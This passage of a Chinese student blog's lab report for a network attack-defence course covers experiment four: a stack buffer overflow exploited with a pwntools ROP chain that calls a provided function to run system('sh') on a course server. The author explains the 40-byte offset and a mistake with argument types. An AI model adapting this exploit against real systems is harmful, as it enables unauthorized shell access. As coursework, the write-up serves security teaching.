+<h2 id="exp4-实验四"><a class="markdownIt-Anchor" href="#exp4-实验四"></a> Exp4 实验四</h2>
+<p>通过栈溢出来实现函数调用，在源码中，需要我们准备三个参数<code>rdi</code>,<code>rsi</code>,<code>rdx</code>，作为目标函数的三个参数a b c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 我们的ROP目标函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">gadget_func</span><span class="params">(<span class="type">uint8_t</span> a, <span class="type">uint8_t</span> b, <span class="type">uint8_t</span> c)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">16</span>];</span><br><span class="line">    buf[<span class="number">0</span>] = a;</span><br><span class="line">    buf[<span class="number">1</span>] = b;</span><br><span class="line">    buf[<span class="number">2</span>] = c;</span><br><span class="line">    buf[<span class="number">3</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    system(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/%E5%9B%BE%E7%89%87%E6%AD%A3%E5%9C%A8%E5%8A%A0%E8%BD%BD%E4%B8%AD..." data-lazy-src="https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/image-20251118173043460.png" alt="image-20251118173043460" /></p>
+<p><strong>脚本</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;210.28.132.84&quot;</span>, <span class="number">9004</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./chall4&quot;</span>)</span><br><span class="line">rop = ROP(e)</span><br><span class="line">rop.call(rop.ret)</span><br><span class="line">rop.call(e.symbols[<span class="string">&#x27;gadget_func&#x27;</span>], [<span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;h&#x27;</span>), <span class="number">0</span>])</span><br><span class="line">log.info(<span class="string">&quot;Constructed ROP chain:\n&quot;</span> + rop.dump())</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span> + rop.chain()</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;payload: &quot;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>在这里的payload构造阶段</p>
+<p>缓冲区是rbp-0x20，然后考虑返回地址是和rbp的偏移量为8，因此payload的offset为40，需要有40个<code>A</code></p>
+<p><strong>脚本解释</strong>
+目标：调用<code>gadget_func('s', 'h', 0)</code>，最终执行system(\sh&quot;)。 计算溢出偏移：<code>buffer[32]</code>占32字节，加上保存的rbp共40字节。</p>
+<ul>
+<li>填充40字节后覆盖返回地址，劫持控制流 构造ROP链：<code>rop.call(e.symbols['gadget_func'], [ord('s'), ord('h'), 0])</code></li>
+</ul>
+<blockquote>
+<p>rop.call(e.symbols[\gadget_func&quot;], [\s&quot;, \h&quot;, 0])是错的，因为我想要给rsi rdi给复制为s和h为字符串，但是被工具认为是需要传入的是字符串（所以在调试信息中会看见）<img src="/%E5%9B%BE%E7%89%87%E6%AD%A3%E5%9C%A8%E5%8A%A0%E8%BD%BD%E4%B8%AD..." data-lazy-src="https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/image-20251118174043968.png" alt="image-20251118174043968" /></p>
+</blockquote>
+<ul>
+<li>使用pwntools自动寻找gadget设置rdi、rsi、rdx寄存器</li>
+<li>依次pop \s&quot;、\h&quot;、0到三个参数寄存器，调用gadget_func 溢出后执行ROP链，gadget_func内部执行system(buf)即可getshell。</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://yama-lei.top">Yama-lei</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://yama-lei.top/posts/27ccea6ad88a/">https://yama-lei.top/posts/27ccea6ad88a/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://yama-lei.top" target="_blank">YamaBlog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/yama.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/015bd2201277/" title="期末复习（SE DS）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">期末复习（SE DS）</div></div><div class="info-2"><div class="info-item-1">原文来源：NJUSE-20-DataStructure/FinalReview.md at main · YDJSIR-NJU/NJUSE-20-DataStructure  20-秋-数据结构与算法   Ver. 南京大学软件学院  Powered by YDJSIR   基本要求  代码相关  大题Java/C++  小题里面他给的是什么就是什么（Java优先）  要读得懂代码  期末占比 非常高，请各位同学耗子尾汁，好好复习，不要翻车  基本算法思想  递归 通过重复将问题分解为同类的子问题而解决问题。  出现场景 渗透全课程  贪心（注意和动态规划的区别） 在每一步选择中都采取在当前状态下最好或最优（即最有利）的选择。  出现场景 Prim、Kruskal、Dijkstra  动态规划（注意和贪心的区别） 通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法。 动态规划法试图仅仅解决每个子问题一次，从而减少计算量：一旦某个给定子问题的解已经算出，则将其记忆化存储，以便下次需要同一个子问题解之时直接查表。   动态规划中不应该有“回溯”，那样就类似于打表了   出现场...</div></div></div></a><a class="pagination-related" href="/posts/e4bd6868d79f/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2"></div></div><div class="info-2"><div class="info-item-1">   序号 项目名称 团队成员 指导教师     1 多视点三维重建研究 陈熙泰、蔡易航、秦翊彬、李昊阳、王竞成、刘馨雅 李元琪   2 视觉问答系统 徐子轩、雷业成、张盛泉、程晓田、符子建 苏丰   3 基于生成式模型的具身智能研究 李烨韬、刘宇哲、吴季鸿、于健、刘淇、蒋润安 霍静   4 深度学习模型bug的定位研究 黄绘骋 陈振宇   5 计算机专业课程知识图谱构建 周马煊、陆知渔、祁书轩 程龚   6 关于人工智能赋能软件架构活动的系统化文献评价研究 王天鸣、林枫、曹伶俐、李丹扬 李杉杉   7 智能翻译模型的构建与应用 葛家韬、谢铭宸 陈振宇、沐燕舟   8 多语言大模型复杂问题推理 孙朔、张科杰、朱思成、章展豪、谢铭宸、张瑞珉、陈天骢 黄书剑   9 基于大语言模型的自适应变异算子与单元测试用例生成方法 陈春雨、王琳睿、罗珺琅 陈振宇、顾思琦   10 软件可追踪性研究的回顾与展望——基于三级文献综述的系统性分析 胡奕博、缪宇轩 匡宏宇    目前进度：  [x] 完善议程  [completion:: 2025-11-16] [x] 排好答辩顺序   答辩顺序在议程...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/%E5%9B%BE%E7%89%87%E6%AD%A3%E5%9C%A8%E5%8A%A0%E8%BD%BD%E4%B8%AD..." data-lazy-src="https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/yama.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Yama-lei</div><div class="author-info-description">记录一个NJUCSer的学习</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">146</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yama-lei"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/yama-lei" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:your@email.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss" style="color: #FFA500;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">博客正在建设中...能看就行...😋😋😋</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">网络攻防实战实验报告</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%BE%97%E6%9C%80%E7%BB%88%E5%88%86%E6%83%85%E5%86%B5"><span class="toc-number">1.1.</span> <span class="toc-text"> 最得最终分情况：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp1-%E9%A2%98%E7%9B%AE%E4%B8%80"><span class="toc-number">1.2.</span> <span class="toc-text"> Exp1 题目一</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%90%93shellcode"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 手搓shellcode：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp2-%E9%A2%98%E7%9B%AE2"><span class="toc-number">1.3.</span> <span class="toc-text"> Exp2 题目2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp3%E5%AE%9E%E9%AA%8C%E4%B8%89"><span class="toc-number">1.4.</span> <span class="toc-text"> Exp3实验三</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp4-%E5%AE%9E%E9%AA%8C%E5%9B%9B"><span class="toc-number">1.5.</span> <span class="toc-text"> Exp4 实验四</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/4c76533e034e/" title="如何从0开始配置一个“好用”的服务器？">如何从0开始配置一个“好用”的服务器？</a><time datetime="2025-11-22T02:45:49.000Z" title="发表于 2025-11-22 10:45:49">2025-11-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/5a81ef49f5e4/" title="人生中第一次遇见挖矿">人生中第一次遇见挖矿</a><time datetime="2025-11-21T14:15:58.000Z" title="发表于 2025-11-21 22:15:58">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/f6b69341f51b/" title="Scene Text Image Super Resolution and Recognition">Scene Text Image Super Resolution and Recognition</a><time datetime="2025-11-21T01:58:17.000Z" title="发表于 2025-11-21 09:58:17">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/015bd2201277/" title="期末复习（SE DS）">期末复习（SE DS）</a><time datetime="2025-11-19T15:07:16.000Z" title="发表于 2025-11-19 23:07:16">2025-11-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/eb4181631f64/" title="数据结构：图">数据结构：图</a><time datetime="2025-11-13T03:22:09.000Z" title="发表于 2025-11-13 11:22:09">2025-11-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="ft"><div class="ft-item-1"><div class="t-top"><div class="t-t-l"><p class="ft-t t-l-t">格言🧬</p><div class="bg-ad"><div>记录一个NJUCSer的学习历程 · 代码改变世界，技术创造未来</div><div class="btn-xz-box"><a class="btn-xz" href="/about/">了解更多</a></div></div></div></div></div><div class="ft-item-2"><p class="ft-t">推荐友链⌛</p><div class="ft-img-group"><div class="img-group-item"><a href="/links/" title="广告位招租"><img src="/%E5%9B%BE%E7%89%87%E6%AD%A3%E5%9C%A8%E5%8A%A0%E8%BD%BD%E4%B8%AD..." data-lazy-src="https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/zhaozu.jpg" alt="广告位招租"/></a></div><div class="img-group-item"><a href="/links/" title="更多友联"><img src="/%E5%9B%BE%E7%89%87%E6%AD%A3%E5%9C%A8%E5%8A%A0%E8%BD%BD%E4%B8%AD..." data-lazy-src="https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/zhaozu.jpg" alt="友链"/></a></div></div></div></div><div class="copyright"><span><b>&copy;2025</b></span><span><b>&nbsp;&nbsp;By Yama-lei</b></span></div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Less is more · © YamaBlog</div><div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" title="博客框架为Hexo"><img src="/%E5%9B%BE%E7%89%87%E6%AD%A3%E5%9C%A8%E5%8A%A0%E8%BD%BD%E4%B8%AD..." data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat-square" alt="Hexo"/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" title="主题版本Butterfly"><img src="/%E5%9B%BE%E7%89%87%E6%AD%A3%E5%9C%A8%E5%8A%A0%E8%BD%BD%E4%B8%AD..." data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat-square" alt="Butterfly"/></a><a class="github-badge" target="_blank" href="https://github.com/yama-lei" style="margin-inline:5px" title="源码托管于GitHub"><img src="/%E5%9B%BE%E7%89%87%E6%AD%A3%E5%9C%A8%E5%8A%A0%E8%BD%BD%E4%B8%AD..." data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat-square" alt="GitHub"/></a></p></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="/js/custom.js"></script><script src="/js/navbar-enhance.js"></script><script src="/js/footer-enhance.js"></script><script src="/js/homepage-enhance.js"></script><script src="/js/page-headers-enhance.js"></script><script src="/js/reading-enhance.js"></script><script defer src="/js/runtime.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
